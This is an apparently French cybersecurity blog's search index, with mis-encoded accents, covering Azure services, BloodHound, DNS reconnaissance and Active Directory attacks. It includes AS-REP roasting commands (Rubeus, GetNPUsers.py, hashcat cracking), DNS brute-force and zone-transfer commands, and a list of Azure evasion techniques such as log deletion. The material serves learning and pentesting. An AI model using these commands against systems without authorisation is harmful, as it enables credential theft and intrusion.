[{"content":"Introduction Azure Network Watcher est un service int√©gr√© d‚ÄôAzure qui fournit une suite d‚Äôoutils permettant de surveiller, diagnostiquer et analyser le trafic r√©seau dans vos environnements Infrastructure-as-a-Service (IaaS).\nIl offre aux administrateurs et aux ing√©nieurs cloud la possibilit√© de :\ncomprendre la topologie r√©seau, identifier rapidement les probl√®mes de connectivit√©, analyser les flux de trafic pour renforcer la s√©curit√©, optimiser la performance de l‚Äôinfrastructure. Network Watcher se compose de trois grands ensembles d‚Äôoutils et fonctionnalit√©s :\nSupervision Outils de diagnostic r√©seau Analyse du trafic Supervision avec Azure Network Watcher Network Watcher propose deux outils de surveillance qui permettent de visualiser et de suivre l‚Äô√©tat des ressources :\nüîπ Topologie La fonctionnalit√© Topologie g√©n√®re une vue graphique de l‚Äôensemble du r√©seau, incluant les r√©seaux virtuels, sous-r√©seaux, interfaces r√©seau (NIC), NSG (Network Security Groups), et machines virtuelles.\n‚û°Ô∏è Cela permet aux √©quipes IT de comprendre rapidement la configuration du r√©seau et de d√©tecter des erreurs de d√©ploiement (par exemple, une VM connect√©e au mauvais sous-r√©seau).\nüîπ Moniteur de connexion Le Connection Monitor fournit une surveillance de bout en bout entre diff√©rents points de terminaison (Azure, locaux ou hybrides).\n‚û°Ô∏è Il mesure la latence, les pertes de paquets et la disponibilit√© des connexions, ce qui est essentiel pour :\ndiagnostiquer les probl√®mes de performance, d√©tecter des interruptions intermittentes, assurer la qualit√© de service (QoS) des applications critiques. Outils de diagnostic r√©seau dans Azure Network Watcher Network Watcher inclut 7 outils puissants pour diagnostiquer et r√©soudre des probl√®mes r√©seau :\nüîπ V√©rification du flux IP Permet de tester si le trafic est autoris√© ou bloqu√© vers/depuis une machine virtuelle.\n‚û°Ô∏è Tr√®s utile pour v√©rifier les probl√®mes de filtrage li√©s aux r√®gles NSG, pare-feu Azure ou UDR (User Defined Routes).\nüîπ Diagnostics NSG Analyse en d√©tail les r√®gles appliqu√©es par un Network Security Group.\n‚û°Ô∏è Cela aide √† identifier rapidement pourquoi un trafic est bloqu√© (par ex. une r√®gle \u0026ldquo;deny all\u0026rdquo; en priorit√© √©lev√©e).\nüîπ Prochaine √©tape (Next Hop) V√©rifie la route emprunt√©e par un paquet vers sa destination.\n‚û°Ô∏è Indispensable pour comprendre si le trafic passe par une passerelle VPN, un pare-feu Azure Firewall, ou Internet.\nüîπ R√®gles de s√©curit√© effectives Affiche l‚Äôensemble des r√®gles cumul√©es appliqu√©es √† une interface r√©seau (NSG + s√©curit√© Azure).\n‚û°Ô∏è Cela √©vite la confusion entre les r√®gles d√©finies et celles r√©ellement appliqu√©es.\nüîπ R√©solution des probl√®mes de connexion Teste une connexion entre une VM et une destination (FQDN, URI, IPv4).\n‚û°Ô∏è Tr√®s pratique pour diagnostiquer un probl√®me d‚Äôacc√®s √† une application ou √† une base de donn√©es.\nüîπ Capture de paquets Permet de lancer une capture de trafic (PCAP) directement depuis une VM, sans installer Wireshark localement.\n‚û°Ô∏è Utile pour l‚Äôanalyse intrusion, performance applicative ou investigation forensique.\nüîπ R√©solution des probl√®mes de VPN Outil sp√©cifique pour diagnostiquer les probl√®mes li√©s aux passerelles VPN et connexions site-√†-site ou point-√†-site.\n‚û°Ô∏è Il v√©rifie l‚Äô√©tat des tunnels, les n√©gociations IPsec et la stabilit√© des sessions.\nAnalyse du trafic avec Azure Network Watcher Network Watcher propose √©galement deux outils d√©di√©s au suivi du trafic :\nüîπ Journaux de flux NSG Permettent de consigner les informations sur le trafic IP entrant et sortant √† travers un NSG.\n‚û°Ô∏è Ces donn√©es peuvent √™tre stock√©es dans Azure Storage, envoy√©es vers Log Analytics ou analys√©es dans SIEM comme Microsoft Sentinel.\nüîπ Traffic Analytics Outil avanc√© qui transforme les journaux de flux en visualisations riches et exploitables.\n‚û°Ô∏è Il permet d‚Äôidentifier :\nles top talkers (VM qui g√©n√®rent le plus de trafic), les connexions suspectes (ex : trafic vers des pays inhabituels), la r√©partition interne/externe du trafic. Utilisation et quotas La section Utilisation + quotas fournit un r√©sum√© global de l‚Äô√©tat des ressources r√©seau d√©ploy√©es dans une r√©gion ou un abonnement.\n‚û°Ô∏è Elle permet de suivre :\nle nombre de r√©seaux virtuels, les limites actuelles (quotas), la consommation par rapport aux seuils disponibles. Limites de Network Watcher Bien que tr√®s puissant, Network Watcher pr√©sente quelques limites :\nIl est limit√© aux ressources IaaS (VM, r√©seaux virtuels, NSG, passerelles). Les services PaaS (ex. App Service) ne sont pas directement pris en charge. Certains outils (comme la capture de paquets) peuvent g√©n√©rer des co√ªts additionnels. Il ne remplace pas un SIEM ou une solution compl√®te de monitoring mais agit comme un outil de diagnostic et de troubleshooting compl√©mentaire. Conclusion Azure Network Watcher est un outil essentiel pour les administrateurs cloud, les ing√©nieurs r√©seau et les √©quipes de s√©curit√©.\nIl permet de gagner du temps dans le diagnostic, de visualiser en temps r√©el la topologie r√©seau, et de renforcer la s√©curit√© en identifiant les flux suspects.\n‚û°Ô∏è Coupl√© avec Azure Monitor, Sentinel et Defender for Cloud, Network Watcher devient un pilier central pour la supervision et la cybers√©curit√© dans Azure.\n","permalink":"https://nyobemichel.me/posts/azure/network-watcher/","summary":"Un guide complet sur Azure Network Watcher : supervision du r√©seau, outils de diagnostic et analyse du trafic pour mieux surveiller et s√©curiser vos environnements IaaS.","title":"Comprendre Azure Network Watcher : Supervision, Diagnostic et Analyse du Trafic"},{"content":"Introduction La certification Microsoft Certified: Azure Security Engineer Associate (AZ-500) est une √©tape cl√© pour les professionnels souhaitant valider leurs comp√©tences en mati√®re de s√©curit√© sur la plateforme Azure. Ce guide pr√©sente les ressources essentielles pour vous aider √† r√©ussir cet examen.\nObjectifs de l\u0026rsquo;examen AZ-500 L\u0026rsquo;examen AZ-500 √©value les comp√©tences suivantes :\nGestion de l\u0026rsquo;identit√© et des acc√®s : Impl√©mentation et gestion des identit√©s et des acc√®s dans Azure. Protection de la plateforme : Mise en ≈ìuvre de la s√©curit√© des r√©seaux, des machines virtuelles et des applications. Gestion des op√©rations de s√©curit√© : Surveillance et gestion des incidents de s√©curit√©. S√©curisation des donn√©es et des applications : Protection des donn√©es, des bases de donn√©es et des applications dans Azure. Ressources officielles 1. Guide d\u0026rsquo;√©tude officiel de Microsoft Ce guide fournit un aper√ßu des comp√©tences mesur√©es lors de l\u0026rsquo;examen, des liens vers des modules d\u0026rsquo;apprentissage et des informations sur le format de l\u0026rsquo;examen.\n2. Microsoft Learn - Parcours d\u0026rsquo;apprentissage Une s√©rie de modules interactifs couvrant les diff√©rents domaines de l\u0026rsquo;examen AZ-500, avec des exercices pratiques et des √©valuations.\n3. √âvaluation pratique gratuite Testez vos connaissances avec une √©valuation gratuite pour √©valuer votre pr√©paration √† l\u0026rsquo;examen.\nConseils pour la pr√©paration Pratiquez r√©guli√®rement : Utilisez les environnements de laboratoire pour mettre en ≈ìuvre les concepts appris. Passez des examens blancs : Familiarisez-vous avec le format de l\u0026rsquo;examen et identifiez vos points faibles. Restez √† jour : Azure √©volue rapidement; assurez-vous de suivre les derni√®res mises √† jour et pratiques recommand√©es. ","permalink":"https://nyobemichel.me/posts/learn/az-500/","summary":"la certification Microsoft Certified: Azure Security Engineer Associate (AZ-500)","title":"AZ-500 : Azure Security Engineer"},{"content":"Introduction BloodHound v8.0, released on July 29, 2025, marks one of the most significant functional updates since the tool\u0026rsquo;s inception. With this version, SpecterOps introduces a major evolution in identity attack path management, expanding BloodHound‚Äôs capabilities beyond Active Directory and Entra ID thanks to OpenGraph.\n1. Ease of Use: Faster and Clearer Access to Information Table View Users can now select the Table layout to display query results in a sortable, structured table, allowing them to choose relevant data and export it to CSV. This enhances quick analysis and facilitates collaboration between identity and security teams.\nQuery Library Over 170 prebuilt queries, organized in YAML format, are available in both BloodHound Enterprise and Community Editions. These queries cover practical use cases and are accessible through a dedicated interface. 2. ACE Inheritance Tracking BloodHound can now precisely highlight where privileges are inherited in Active Directory, allowing defenders to mitigate risk at the source without manually tracing permission inheritance.\n3. Microsoft Privileged Identity Management (PIM) BloodHound Enterprise now supports PIM roles: it detects attack paths that rely on these roles‚Äîeven when they are not active‚Äîand flags misconfigurations where sensitive roles can be activated without MFA.\n4. Expanded Visibility into Domain and Forest Trusts The previous TrustedBy model has been replaced by four new trust edge types, offering more accurate visibility into how trusts are configured and whether they can be abused.\n5. BloodHound OpenGraph: A New Frontier in Attack Path Analysis OpenGraph enables BloodHound to ingest data from third-party platforms (GitHub, Snowflake, Microsoft SQL Server, etc.), extending attack path mapping beyond AD to any critical enterprise system.\n6. New Extensibility-Oriented Features Privilege Zones Analysis Allows the definition of \u0026ldquo;Privilege Zones\u0026rdquo; to focus on the most sensitive or regulated assets (e.g., PCI, HIPAA). This enables a refined, organization-wide Least Privilege approach.\nIntegrations ServiceNow: Automatically generates tickets to track discovered vulnerabilities. Duo: Supports multi-factor authentication for accessing BloodHound Enterprise. Conclusion BloodHound v8.0 represents a major step forward by combining:\nImproved usability (Table View, Query Library, Inheritance Tracking) Extended reach (OpenGraph for external platforms) Stronger security posture (PIM support, Privilege Zones, MFA integrations) Whether you\u0026rsquo;re part of a Red Team mapping complex attack paths or a Blue Team managing identity risk, BloodHound v8.0 is a strategic tool for proactively and holistically managing access and privilege across the enterprise.\n","permalink":"https://nyobemichel.me/posts/articles/bloodhound-v8/","summary":"Explore BloodHound v8, an advanced Active Directory mapping tool used by Red Teams to identify attack paths. Discover its setup, graph-based architecture, and new security and management features.","title":"BloodHound v8"},{"content":"Intro AWS AWS Organization AWS principals Exploitation of AWS Services IAM STS - Security Token Service KMS - key Management Service Secret Manager s3 - Simple Storage Service EC2 Elastic Cloud Computing lighsail lambda API Gateway EFS Elastic File System RDS - Relational Database Service DynamoDB ECR - Elastic Container Registry ECS - Elastic Container Service Beanstalk CodeBuild SQS Simple Queue Service SNS Simple Notification Service Cognito Methodologie AWS White Box Methodology AWS Black Box Methodology How to Bypass Detections Cloudtrail GuardDuty\n","permalink":"https://nyobemichel.me/posts/formations/aws-attack-and-defense/","summary":"Explorez les techniques d\u0026rsquo;attaque et de d√©fense sur AWS : reconnaissance, exploitation, √©l√©vation de privil√®ges, d√©tection et mitigation.","title":"AWS Attack and Defense: Strat√©gies offensives et d√©fensives dans le cloud"},{"content":" Azure Basics Azure Organization Entra I Azure Tokens \u0026amp; APIs Basic Enumeration Tools Exploitation of Azure Services Entra ID IAM6 Azure IAM3 Azure Applications1 Azure Key Vault6 Azure Virtual Machine \u0026amp; Networking7 Storage Accounts6 Azure File Share5 Azure Table Storage1 Azure SQL Database3 Azure MySQL \u0026amp; PostgreSQL2 Azure CosmosDB3 Azure App Service5 Azure Research Techniques Azure Function Apps4 Static Web Apps5 Azure Container Registry3 Azure Container Instances, Apps \u0026amp; Jobs7 Azure Queue2 Azure Service Bus2 Azure Automation Account3 Azure Logic Apps1 Azure Cloud Shell1 Azure Virtual Desktop2 Methodologies White box1 Black box2 Pivoting between Entra ID \u0026amp; AD (Coming soon)3 Common Detection Mechanisms Azure \u0026amp; Entra ID Logging \u0026amp; Monitoring1 Microsoft Sentinel Microsoft Defender for Cloud \u0026amp; Microsoft Defender EASM ","permalink":"https://nyobemichel.me/posts/formations/azure-attack-et-defense/","summary":"D√©couvrez les techniques d\u0026rsquo;attaque et de d√©fense dans Azure, en explorant Entra ID, la s√©curit√© des identit√©s, et les bonnes pratiques pour renforcer votre posture cloud.","title":"Azure Attack et Defense"},{"content":"Comment fonctionne le DNS Lorsque vous saisissez le nom de domaine, votre ordinateur v√©rifie d\u0026rsquo;abord sa m√©moire (cache) pour voir s\u0026rsquo;il se souvient de l\u0026rsquo;adresse IP d\u0026rsquo;une visite pr√©c√©dente. Dans le cas contraire, il fait appel √† un r√©solveur DNS, g√©n√©ralement fourni par votre fournisseur d\u0026rsquo;acc√®s √† Internet (FAI). Le r√©solveur dispose √©galement d\u0026rsquo;un cache. S\u0026rsquo;il n\u0026rsquo;y trouve pas l\u0026rsquo;adresse IP, il entame un parcours dans la hi√©rarchie DNS. Il commence par interroger un serveur de noms racine, qui agit comme le biblioth√©caire d\u0026rsquo;Internet. Le serveur racine ne conna√Æt pas l\u0026rsquo;adresse exacte, mais il sait qui la conna√Æt¬†: le serveur de noms de domaine de premier niveau (TLD) responsable de l\u0026rsquo;extension du domaine (par exemple, .com, .org). Il oriente le r√©solveur dans la bonne direction. |A|Enregistrement d\u0026rsquo;adresse|Mappe un nom d\u0026rsquo;h√¥te √† son adresse IPv4.|www.example.com.DANS UN192.0.2.1| |AAAA|Enregistrement d\u0026rsquo;adresse IPv6|Mappe un nom d\u0026rsquo;h√¥te √† son adresse IPv6.|www.example.com.EN AAAA2001:db8:85a3::8a2e:370:7334| |CNAME|Enregistrement de nom canonique|Cr√©e un alias pour un nom d\u0026rsquo;h√¥te, le pointant vers un autre nom d\u0026rsquo;h√¥te.|blog.example.com.EN CNAMEwebserver.example.net.| |MX|Enregistrement d\u0026rsquo;√©change de courrier|Sp√©cifie le(s) serveur(s) de messagerie charg√©(s) de g√©rer les e-mails pour le domaine.|example.com.EN MX 10mail.example.com.| |NS|Enregistrement du serveur de noms|D√©l√©gue une zone DNS √† un serveur de noms faisant autorit√© sp√©cifique.|example.com.EN N.-√â.ns1.example.com.| |TXT|Enregistrement de texte|Stocke des informations textuelles arbitraires, souvent utilis√©es pour la v√©rification de domaine ou les politiques de s√©curit√©.|example.com.EN TXT¬†\u0026quot;v=spf1 mx -all\u0026quot;(enregistrement SPF)| |SOA|D√©but de l\u0026rsquo;enregistrement d\u0026rsquo;autorit√©|Sp√©cifie les informations administratives sur une zone DNS, y compris le serveur de noms principal, l\u0026rsquo;e-mail de la personne responsable et d\u0026rsquo;autres param√®tres.|example.com.√Ä SOAns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400| |SRV|Dossier de service|D√©finit le nom d\u0026rsquo;h√¥te et le num√©ro de port pour des services sp√©cifiques.|_sip._udp.example.com.DANS SRV 10 5 5060sipserver.example.com.| |PTR|Enregistrement du pointeur|Utilis√© pour les recherches DNS invers√©es, mappant une adresse IP √† un nom d\u0026rsquo;h√¥te.|1.2.0.192.in-addr.arpa.EN PTRwww.example.com.|\nOutils DNS dig : Outil de recherche DNS polyvalent qui prend en charge diff√©rents types de requ√™tes (A, MX, NS, TXT, etc.) et une sortie d√©taill√©e. nslookup : Outil de recherche DNS plus simple, principalement pour les enregistrements A, AAAA et MX. dnsenum : Outil d\u0026rsquo;√©num√©ration DNS automatis√©, attaques par dictionnaire, force brute, transferts de zone (si autoris√©). dnsrecon : Combine plusieurs techniques de reconnaissance DNS et prend en charge divers formats de sortie. theHarvester : Outil OSINT qui collecte des informations provenant de diverses sources, notamment les enregistrements DNS (adresses e-mail).\nDig La¬†digcommande (¬†Domain Information Groper) est un utilitaire polyvalent et puissant permettant d\u0026rsquo;interroger les serveurs DNS et de r√©cup√©rer diff√©rents types d\u0026rsquo;enregistrements DNS. Sa flexibilit√© et ses r√©sultats d√©taill√©s et personnalisables en font un choix incontournable.\nSous-domain Enumeration de sous-domains il s\u0026rsquo;agit du processus d\u0026rsquo;identification et de recensement syst√©matiques de ces sous-domaines. Du point de vue DNS, les sous-domaines sont g√©n√©ralement repr√©sent√©s par des enregistrements¬†A(ou,¬†AAAApour IPv6, des enregistrements), qui associent le nom du sous-domaine √† son adresse IP correspondante.\n√ânum√©ration des sous-domaines actifs Une technique active plus courante¬†brute-force enumerationconsiste √† tester syst√©matiquement une liste de noms de sous-domaines potentiels par rapport au domaine cible. Des outils comme¬†dnsenum,¬†ffufet¬†gobusterpeuvent automatiser ce processus en utilisant des listes de mots de noms de sous-domaines courants ou des listes personnalis√©es bas√©es sur des mod√®les sp√©cifiques.\n√ânum√©ration passive des sous-domaines Cette m√©thode s\u0026rsquo;appuie sur des sources d\u0026rsquo;informations externes pour d√©couvrir les sous-domaines sans interroger directement les serveurs DNS de la cible.¬†Certificate Transparency (CT) logsLes r√©f√©rentiels publics de certificats SSL/TLS constituent une ressource pr√©cieuse. Ces certificats incluent souvent une liste de sous-domaines associ√©s dans leur champ ¬´¬†Subject Alternative Name¬†¬ª (SAN), offrant ainsi une mine d\u0026rsquo;informations sur les cibles potentielles.\nBruteforcement de sous-domaine il existe plusieurs outils disponibles qui excellent dans l‚Äô√©num√©ration par force brute¬†: dns√©num fierce dnsrecon amass assetfinder puredns\nDNSEnum dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r Transferts de zone DNS Un transfert de zone DNS consiste essentiellement √† copier tous les enregistrements DNS d\u0026rsquo;une zone (un domaine et ses sous-domaines) d\u0026rsquo;un serveur de noms √† un autre.\nVous pouvez utiliser la¬†digcommande pour demander un transfert de zone¬†:\ndig axfr @nsztm1.digi.ninja zonetransfer.me Hotes Virtuels Une fois le DNS dirig√© vers le bon serveur, la configuration du serveur web devient cruciale pour d√©terminer le traitement des requ√™tes entrantes.\nVirtual Hosts(¬†VHosts) : Les h√¥tes virtuels sont des configurations au sein d\u0026rsquo;un serveur web permettant d\u0026rsquo;h√©berger plusieurs sites web ou applications sur un m√™me serveur. Plusieurs outils sont disponibles pour aider √† la d√©couverte des h√¥tes virtuels : gobuster Feroxbuster ffuf\nGobuster Gobuster est un outil polyvalent couramment utilis√© pour le for√ßage de r√©pertoires et de fichiers, mais il excelle √©galement dans la d√©couverte d\u0026rsquo;h√¥tes virtuels. Il envoie syst√©matiquement des requ√™tes HTTP avec diff√©rents¬†Hosten-t√™tes √† une adresse IP cible, puis analyse les r√©ponses pour identifier les h√¥tes virtuels valides.\ngobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain Certificate Transparency Logs Banner Grabbing La premi√®re √©tape consiste √† collecter les informations directement depuis le serveur web. Pour ce faire, nous utilisons la¬†curlcommande avec l\u0026rsquo;¬†-Iindicateur (ou¬†--head) pour r√©cup√©rer uniquement les en-t√™tes HTTP, et non l\u0026rsquo;int√©gralit√© du contenu de la page.\nNikto https://web.archive.org/\n","permalink":"https://nyobemichel.me/posts/learn/dns/","summary":"DNS","title":"DNS"},{"content":"Avec l\u0026rsquo;adoption massive du cloud computing, les entreprises migrent de plus en plus leurs infrastructures vers des environnements flexibles, scalables et accessibles √† distance. Parmi les principaux fournisseurs de services cloud, Microsoft Azure occupe une place de leader, offrant un large √©ventail de services allant de la simple machine virtuelle √† des solutions complexes d\u0026rsquo;intelligence artificielle, de gestion d\u0026rsquo;identit√©, ou encore de DevOps. Cependant, cette complexit√© fonctionnelle ouvre √©galement la voie √† de nombreuses erreurs de configuration, abus de privil√®ges et vuln√©rabilit√©s potentielles. Azure, en tant que plateforme, peut √™tre la cible de diff√©rentes techniques offensives utilis√©es par des attaquants internes ou externes cherchant √† compromettre l‚Äôint√©grit√©, la disponibilit√© ou la confidentialit√© des ressources cloud d‚Äôune organisation.\nAcc√®s Initial (Initial Access) Credential stuffing (Azure AD / Entra ID) Phishing avec MFA Fatigue / Consent Phishing Token replay (refresh ou access tokens vol√©s) Abuse des partages publics (Blob/Files avec ACL public) Exploitation de credentials hardcod√©s (dans code, Azure DevOps, GitHub Actions) Exploitation de mots de passe faibles sur comptes invit√©s ou service principals Exploitation d‚Äôune app mal configur√©e (malicious redirect URI, consent mal g√©r√©) √âvasion des D√©fenses (Defense Evasion) Suppression des logs dans Azure Monitor / Log Analytics Usage de credentials temporaires (MSI tokens, access tokens via IMDS) Utilisation d‚Äôapplications \u0026ldquo;trusted\u0026rdquo; (abuse de consentements OAuth) Ajout de r√®gles de suppression d‚Äôalertes dans Microsoft Defender for Cloud ByPass Conditional Access (via Identity Protection, ou device spoofing) Escalade de Privil√®ges (Privilege Escalation) Abus de r√¥les mal configur√©s : Owner, User Access Administrator, Contributor, etc. Chaining permissions : Lecture de secrets dans Key Vault ‚Üí acc√®s admin Escalade via Automation Account / Runbook Abuse d‚Äôun Logic App ou Function App Abus de Managed Identities (MSI) pour obtenir des tokens avec haut privil√®ge ","permalink":"https://nyobemichel.me/posts/roadmap/azure-hacking/","summary":"Azure Hacking","title":"Azure Hacking"},{"content":"Lorsque l‚Äôauthentification se produit dans Kerberos, la premi√®re chose qui se produit est une demande d‚Äôauthentification au contr√¥leur de domaine afin que l‚Äôidentit√© qui tente de s‚Äôauthentifier puisse √™tre v√©rifi√©e. Cette demande est connue sous le nom de demande de serveur d‚Äôauthentification (AS-REQ). Une fois l\u0026rsquo;authentification du client valid√©e, le contr√¥leur de domaine envoie une r√©ponse du serveur d\u0026rsquo;authentification (AS-REP) au client, contenant une cl√© de session et un ticket d\u0026rsquo;octroi de ticket (TGT). AS-REP Roasting vide les hachages krbasrep5 des comptes utilisateurs dont la pr√©-authentification¬†Kerberos¬†est d√©sactiv√©e. Contrairement √† Kerberoasting, ces utilisateurs ne doivent pas n√©cessairement √™tre des comptes de service. La seule condition pour pouvoir effectuer AS-REP Roasting sur un utilisateur est que la pr√©-authentification soit d√©sactiv√©e.\nrubeus.exe asreproast D√©chiffrez ces hachages avec hashcat -¬†1.) Transf√©rez le hachage de la machine cible vers votre machine attaquante et placez le hachage dans un fichier txt\n2.) Ins√©rez 23$ apr√®s $krb5asrep$ afin que la premi√®re ligne soit $krb5asrep$23$User\u0026hellip;..\nUtilisez la m√™me liste de mots que celle que vous avez t√©l√©charg√©e dans la t√¢che 4\n3.)¬†hashcat -m 18200 hash.txt Pass.txt¬†- D√©cryptez ces hachages¬†! La torr√©faction Rubeus AS-REP utilise le mode hashcat 18200.\nEnumeration - Identification des comptes vuln√©rables Au cours de cette phase, vous identifiez les comptes utilisateurs Active Directory pour lesquels¬†la pr√©-authentification¬†Kerberos est d√©sactiv√©e. Les comptes sans pr√©-authentification permettent √† tout utilisateur du r√©seau de demander un ticket¬†Kerberos¬†(notamment un AS-REP) sans avoir √† prouver son identit√©. Rubeus GetNPUsers.py d\u0026rsquo;Impacket\nGetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py https://www.hackthebox.com/blog/as-rep-roasting-detection\n","permalink":"https://nyobemichel.me/posts/activedirectory/as-rep-roasting/","summary":"Entra ID","title":"AS-REP roasting"},{"content":"Le moyen le plus simple d\u0026rsquo;acc√©der aux donn√©es WHOIS est d\u0026rsquo;utiliser l\u0026rsquo;¬†whoisoutil en ligne de commande. IANA (Internet Assigned Numbers Authority )\n","permalink":"https://nyobemichel.me/posts/outils/whois/","summary":"Whois","title":"Whois"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/active-directory---hacking/","summary":"key vault","title":"Active Directory - Hacking"},{"content":"Qu‚Äôest-ce qu‚ÄôAzure Key Vault ? Azure Key Vault est un service cloud permettant de stocker les secrets et d‚Äôy acc√©der en toute s√©curit√©.Il peut s‚Äôagir de:\nLes secrets : mots de passe, cha√Ænes de connexion, jetons, etc. Les cl√©s de chiffrement : pour chiffrer des donn√©es dans d\u0026rsquo;autres services. Les certificats : certificats SSL/TLS utilis√©s dans des services Azure. Les modules HSM (Hardware Security Modules) : stocker les cl√©s dans du mat√©riel s√©curis√©. son objectif est d\u0026rsquo;√©viter d\u0026rsquo;int√©grer des donn√©es directement dans le¬†code source¬†d\u0026rsquo;un¬†programme¬†ou d\u0026rsquo;un autre objet ex√©cutable les fichiers de configuration. cas d\u0026rsquo;tilisation de Azure Key Vault La centralisation du stockage des secrets d‚Äôapplication dans Azure Key Vault vous permet de contr√¥ler la distribution de ces secrets. Key Vault r√©duit consid√©rablement les risques de fuite accidentelle des secrets. Lorsque les d√©veloppeurs d‚Äôapplications utilisent Key Vault, ils n‚Äôont plus besoin de stocker des informations de s√©curit√© dans leur application.\nAuthentification s√©curis√©e : Une app web r√©cup√®re un secret DB via Key Vault Chiffrement de donn√©es : Azure SQL, Blob, ou Disk utilisent une cl√© stock√©e dans Key Vault Rotation automatique : Gestion automatique des certificats SSL Int√©gration DevSecOps : Azure DevOps ou GitHub r√©cup√®rent des secrets √† l\u0026rsquo;ex√©cution\nArchitecture et composants Le service Key¬†Vault prend en charge deux types de conteneurs¬†: les coffres et les pools HSM (modules de s√©curit√© mat√©riels) manag√©s. Les coffres prennent en charge le stockage des cl√©s logicielles et sauvegard√©es avec HSM, les secrets et les certificats. Les pools HSM manag√©s prennent uniquement en charge les cl√©s sauvegard√©es avec HSM. les secrets et les certificats sont collectivement appel√©s ¬´¬†objets¬†¬ª.\nIdentificateurs d\u0026rsquo;objet Les objets sont identifi√©s de mani√®re unique dans Key Vault √† l‚Äôaide d‚Äôun identificateur qui ne respecte pas la casse appel√© identificateur d‚Äôobjet. Il n‚Äôy a pas deux objets avec le m√™me identificateur dans le syst√®me, quel que soit l‚Äôemplacement g√©ographique. L‚Äôidentificateur est constitu√© d‚Äôun pr√©fixe qui identifie le coffre de cl√©s, du type d‚Äôobjet, du nom d‚Äôobjet fourni par l‚Äôutilisateur et d‚Äôune version d‚Äôobjet. Les identificateurs qui n‚Äôincluent pas la version de l‚Äôobjet sont appel√©s des ¬´¬†identificateurs de base¬†¬ª. Les identificateurs d‚Äôobjet Key Vault sont √©galement des URL valides.\nUn identificateur d‚Äôobjet a le format g√©n√©ral suivant (selon le type de conteneur)¬†:\nPour les coffres¬†:¬†https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version} Pour les pools Managed HSM¬†:¬†https://{hsm-name}.managedhsm.azure.net/{object-type}/{object-name}/{object-version} Structure d‚ÄôURL de requ√™te Les op√©rations de gestion des cl√©s utilisent des verbes HTTP, notamment DELETE, GET, PATCH et PUT. Les op√©rations de chiffrement sur les objets cl√©s existants utilisent HTTP POST.\nPour les clients qui ne peuvent pas prendre en charge des verbes HTTP sp√©cifiques, Azure Key Vault autorise l‚Äôutilisation de HTTP POST avec l‚Äôen-t√™te¬†X-HTTP-REQUEST¬†pour sp√©cifier le verbe pr√©vu.\nPour utiliser des objets dans Azure Key Vault, voici des exemples d‚ÄôURL :\nPour CR√âER une cl√© appel√©e TESTKEY dans un coffre de cl√©s, utilisez :¬†PUT /keys/TESTKEY?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour IMPORTER une cl√© appel√©e IMPORTEDKEY dans un coffre de cl√©s, utilisez -¬†POST /keys/IMPORTEDKEY/import?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour OBTENIR un secret appel√© MYSECRET dans un coffre de cl√©s, utilisez -¬†GET /secrets/MYSECRET?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour SIGNER un code de hachage utilisant une cl√© nomm√©e TESTKEY dans Key Vault, utilisez :¬†POST /keys/TESTKEY/sign?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nL‚Äôautorit√© pour une demande adress√©e √† un Key Vault est toujours la suivante :\nPour les coffres¬†:¬†https://{keyvault-name}.vault.azure.net/ Pour les modules HSM manag√©s :¬†https://{HSM-name}.managedhsm.azure.net/¬†les cl√©s sont toujours stock√©es sous le chemin /keys, tandis que les secrets sont toujours stock√©s sous le chemin /secrets. Options d‚Äôauthentification Key Vault Lorsque vous cr√©ez un coffre de cl√©s dans un abonnement Azure, il est automatiquement associ√© au locataire Microsoft Entra de l‚Äôabonnement. les applications peuvent acc√©der au coffre de cl√©s de trois mani√®res : Application uniquement¬†: l‚Äôapplication repr√©sente un principal du service ou une identit√© manag√©e. Utilisateur uniquement¬†: l‚Äôutilisateur acc√®de au coffre de cl√©s √† partir de n‚Äôimporte quelle application inscrite dans le locataire. Application-plus-utilisateur¬†(parfois appel√©¬†identit√© compos√©e)¬†: l‚Äôutilisateur est tenu d‚Äôacc√©der au coffre de cl√©s √† partir d‚Äôune application sp√©cifique¬†et¬†l‚Äôapplication doit utiliser le flux OBO (Authentification On-Behalf-Of) pour emprunter l‚Äôidentit√© de l‚Äôutilisateur.\nmod√®le d‚Äôacc√®s L‚Äôacc√®s √† un coffre de cl√©s est contr√¥l√© par le biais de deux interfaces : le¬†plan de contr√¥le¬†et le¬†plan de donn√©es. Les deux plans utilisent¬†Microsoft Entra ID¬†pour l‚Äôauthentification. Pour l‚Äôautorisation, le plan de contr√¥le utilise le¬†contr√¥le d‚Äôacc√®s en fonction du r√¥le Azure (Azure RBAC)¬†et le plan de donn√©es utilise une¬†strat√©gie d‚Äôacc√®s Key Vault¬†et¬†Azure RBAC pour les op√©rations de plan de donn√©es Key Vault.\nKey Vault prend en charge les strat√©gies d‚Äôacc√®s conditionnel Microsoft Entra. Vous pouvez contr√¥ler l‚Äôacc√®s aux cl√©s, aux certificats et aux secrets Key Vault en utilisant des strat√©gies d‚Äôacc√®s Azure RBAC ou Key Vault. cr√©ez un coffre de cl√©s dans Azure Key Vault Azure Key Vault est un service cloud qui fonctionne comme un magasin des secrets s√©curis√©. Vous pouvez stocker des cl√©s, des mots de passe, des certificats et d‚Äôautres secrets en toute s√©curit√©.\nSi vous ne disposez pas d‚Äôun compte Azure,¬†cr√©ez-en un gratuitement¬†avant de commencer. Utilisez l‚Äôenvironnement Bash dans¬†Azure Cloud Shell. https://shell.azure.com/ Si vous pr√©f√©rez ex√©cuter des commandes de r√©f√©rence CLI localement, installez Azure CLI. Si vous ex√©cutez sur Windows ou macOS, envisagez d‚Äôex√©cuter Azure CLI dans un conteneur Docker. Si vous utilisez une installation locale, connectez-vous √† Azure CLI √† l‚Äôaide de la commande¬†az login. Lorsque vous y √™tes invit√©, installez l‚Äôextension Azure CLI lors de la premi√®re utilisation. Ex√©cutez¬†az version¬†pour rechercher la version et les biblioth√®ques d√©pendantes install√©es. Pour effectuer une mise √† niveau vers la derni√®re version, ex√©cutez¬†az upgrade. 